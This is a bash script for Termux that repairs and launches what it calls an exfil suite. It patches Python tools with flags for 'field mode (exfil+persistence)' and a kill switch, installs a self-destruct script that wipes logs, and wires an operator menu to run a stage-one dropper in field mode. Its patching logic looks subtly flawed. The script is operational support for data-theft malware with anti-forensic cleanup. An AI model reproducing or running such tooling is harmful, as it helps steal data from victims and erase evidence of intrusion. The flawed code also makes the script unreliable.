#!/data/data/com.termux/files/usr/bin/bash
# Final Exfil Repair + TUI Wire Script by Harpy 🦅

EXFIL_DIR=~/exfil
LOG_DIR="$EXFIL_DIR/.logs"
SELF_DESTRUCT="$EXFIL_DIR/self_destruct_loader.sh"

mkdir -p "$LOG_DIR"

echo "[*] Injecting fresh argparse block..."
read -r -d '' ARGPATCH <<'EOF'
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--field", action="store_true", help="Field mode (exfil+persistence)")
parser.add_argument("--lab", action="store_true", help="Lab mode (safe testing)")
parser.add_argument("--consent", action="store_true", help="Acknowledge and proceed")
parser.add_argument("--kill", action="store_true", help="Trigger kill switch")
args = parser.parse_args()
EOF

for script in "$EXFIL_DIR"/*.py; do
    if grep -q "argparse" "$script"; then
        awk -v patch="$ARGPATCH" '
            BEGIN {done=0}
            /^import/ && done==0 {print patch; done=1}
            {print}
        ' "$script" > "$script.tmp" && mv "$script.tmp" "$script"
        echo "[+] Patched: $(basename "$script")"
    fi
    chmod +x "$script"
done

echo "[*] Installing self-destruct script..."
if [ ! -f "$SELF_DESTRUCT" ]; then
cat > "$SELF_DESTRUCT" <<'EOF'
#!/data/data/com.termux/files/usr/bin/bash
echo "[!] Self-destruct sequence triggered..."
rm -rf ~/exfil/.logs/*
rm -rf ~/exfil/__pycache__/*
echo "[*] Wipe complete. Session terminated."
EOF
chmod +x "$SELF_DESTRUCT"
echo "[+] Created self_destruct_loader.sh"
fi

echo "[*] Verifying and patching TUI wiring..."
sed -i 's|python3 stage_1_dropper.py.*|python3 stage_1_dropper.py --field --consent|' "$EXFIL_DIR/operator_menu.sh"
sed -i 's|python3 exfil_launcher.py.*|python3 exfil_launcher.py --lab --consent|' "$EXFIL_DIR/operator_menu.sh"
chmod +x "$EXFIL_DIR/operator_menu.sh"

echo "✅ Exfil suite fully repaired & operational. Launch TUI:"
echo "$EXFIL_DIR/operator_menu.sh"
